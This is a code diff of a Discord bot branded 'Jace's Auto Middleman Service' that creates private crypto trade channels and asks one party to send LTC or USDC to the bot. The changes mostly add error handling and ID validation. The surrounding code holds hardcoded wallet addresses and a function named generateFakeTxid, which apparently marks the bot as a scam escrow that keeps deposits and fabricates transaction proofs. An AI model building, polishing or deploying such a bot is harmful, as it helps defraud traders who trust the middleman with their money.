@@ -30,8 +30,6 @@ const client = new Client({
 });
 
 const OWNER_ID = process.env.OWNER_ID;
-const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
-
 const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
@@ -41,10 +39,14 @@ let logChannelId = null;
 let panelCategoryId = null;
 
 function loadConfig() {
-  const logRow = db.prepare("SELECT value FROM config WHERE key='logChannel'").get();
-  if (logRow) logChannelId = logRow.value;
-  const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
-  if (catRow) panelCategoryId = catRow.value;
+  try {
+    const logRow = db.prepare("SELECT value FROM config WHERE key='logChannel'").get();
+    if (logRow) logChannelId = logRow.value;
+    const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
+    if (catRow) panelCategoryId = catRow.value;
+  } catch (e) {
+    console.log('Config load error:', e.message);
+  }
 }
 
 function generateFakeTxid() {
@@ -125,7 +127,7 @@ const commands = [
   new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
 ].map(cmd => cmd.toJSON());
 
-const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
+const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
 
 client.once(Events.ClientReady, async () => {
   console.log(`Logged in as ${client.user.tag}`);
@@ -151,7 +153,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
     console.error('Interaction error:', err);
     try {
       if (!interaction.replied && !interaction.deferred) {
-        await interaction.reply({ content: '❌ An error occurred.', flags: MessageFlags.Ephemeral });
+        await interaction.reply({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral });
       }
     } catch {}
   }
@@ -285,74 +287,96 @@ async function handleModal(interaction) {
 }
 
 async function handleTradeDetailsModal(interaction) {
-  const isLtc = interaction.customId === 'ltc_modal';
-  const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
-  const youGiving = interaction.fields.getTextInputValue('youGiving');
-  const theyGiving = interaction.fields.getTextInputValue('theyGiving');
-  
-  let otherUserId = rawInput.replace(/[<@!>]/g, '');
-  if (!/^\d+$/.test(otherUserId)) {
-    try {
-      const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
-      if (members.size > 0) otherUserId = members.first().id;
-    } catch (e) {}
-  }
-  
-  let otherMember;
   try {
-    otherMember = await interaction.guild.members.fetch(otherUserId);
+    const isLtc = interaction.customId === 'ltc_modal';
+    const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
+    const youGiving = interaction.fields.getTextInputValue('youGiving');
+    const theyGiving = interaction.fields.getTextInputValue('theyGiving');
+    
+    let otherUserId = rawInput.replace(/[<@!>]/g, '');
+    
+    // Try to resolve by username if not pure ID
+    if (!/^\d{17,19}$/.test(otherUserId)) {
+      try {
+        const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
+        if (members.size > 0) {
+          otherUserId = members.first().id;
+        }
+      } catch (e) {
+        console.log('Username lookup failed:', e.message);
+      }
+    }
+    
+    // Validate ID format
+    if (!/^\d{17,19}$/.test(otherUserId)) {
+      return interaction.reply({ content: `❌ Invalid user format: "${rawInput}". Use ID or username.`, flags: MessageFlags.Ephemeral });
+    }
+    
+    let otherMember;
+    try {
+      otherMember = await interaction.guild.members.fetch(otherUserId);
+    } catch (err) {
+      return interaction.reply({ content: `❌ User not found in server: "${rawInput}"`, flags: MessageFlags.Ephemeral });
+    }
+    
+    if (otherUserId === interaction.user.id) {
+      return interaction.reply({ content: '❌ You cannot trade with yourself.', flags: MessageFlags.Ephemeral });
+    }
+    
+    const channelOptions = {
+      name: `${isLtc ? 'ltc' : 'usdc'}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
+      type: ChannelType.GuildText,
+      permissionOverwrites: [
+        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
+        { id: otherUserId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
+        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
+      ]
+    };
+    
+    if (panelCategoryId) {
+      const category = await interaction.guild.channels.fetch(panelCategoryId).catch(() => null);
+      if (category) channelOptions.parent = panelCategoryId;
+    }
+    
+    const channel = await interaction.guild.channels.create(channelOptions);
+    
+    const result = db.prepare('INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, "role_selection", ?)').run(channel.id, interaction.user.id, otherUserId, isLtc ? 'ltc' : 'usdc');
+    const tradeId = result.lastInsertRowid;
+    
+    await interaction.reply({ content: `✅ Trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
+    
+    const embed = new EmbedBuilder()
+      .setTitle("👋 Jace's Auto Middleman Service")
+      .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
+      .addFields(
+        { name: `${interaction.user.username}'s side:`, value: youGiving, inline: true },
+        { name: `${otherMember.user.username}'s side:`, value: theyGiving, inline: true }
+      )
+      .setColor(0x5865F2);
+    
+    const deleteRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`delete_${tradeId}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
+    );
+    
+    await channel.send({ content: `${interaction.user} ${otherMember}`, embeds: [embed], components: [deleteRow] });
+    
+    const roleEmbed = new EmbedBuilder()
+      .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.')
+      .setColor(0x5865F2);
+    
+    const roleRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
+      new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
+      new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
+    );
+    
+    await channel.send({ embeds: [roleEmbed], components: [roleRow] });
+    
   } catch (err) {
-    return interaction.reply({ content: `❌ Could not find user "${rawInput}" in this server.`, flags: MessageFlags.Ephemeral });
+    console.error('Create ticket error:', err);
+    await interaction.reply({ content: `❌ Error creating ticket: ${err.message}`, flags: MessageFlags.Ephemeral });
   }
-  
-  if (otherUserId === interaction.user.id) {
-    return interaction.reply({ content: '❌ You cannot trade with yourself.', flags: MessageFlags.Ephemeral });
-  }
-  
-  const channelOptions = {
-    name: `${isLtc ? 'ltc' : 'usdc'}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
-    type: ChannelType.GuildText,
-    permissionOverwrites: [
-      { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
-      { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
-      { id: otherUserId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
-      { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
-    ]
-  };
-  if (panelCategoryId) channelOptions.parent = panelCategoryId;
-  
-  const channel = await interaction.guild.channels.create(channelOptions);
-  const result = db.prepare('INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, "role_selection", ?)').run(channel.id, interaction.user.id, otherUserId, isLtc ? 'ltc' : 'usdc');
-  const tradeId = result.lastInsertRowid;
-  
-  await interaction.reply({ content: `✅ Trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
-  
-  const embed = new EmbedBuilder()
-    .setTitle("👋 Jace's Auto Middleman Service")
-    .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
-    .addFields(
-      { name: `${interaction.user.username}'s side:`, value: youGiving, inline: true },
-      { name: `${otherMember.user.username}'s side:`, value: theyGiving, inline: true }
-    )
-    .setColor(0x5865F2);
-  
-  const deleteRow = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId(`delete_${tradeId}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
-  );
-  
-  await channel.send({ content: `${interaction.user} ${otherMember}`, embeds: [embed], components: [deleteRow] });
-  
-  const roleEmbed = new EmbedBuilder()
-    .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.')
-    .setColor(0x5865F2);
-  
-  const roleRow = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
-    new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
-    new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
-  );
-  
-  await channel.send({ embeds: [roleEmbed], components: [roleRow] });
 }
 
 async function handleRoleSelection(interaction) {
@@ -660,4 +684,4 @@ async function handleAddressModal(interaction) {
   await interaction.reply({ embeds: [embed], components: [row] });
 }
 
-client.login(DISCORD_TOKEN);
+client.login(process.env.DISCORD_TOKEN);
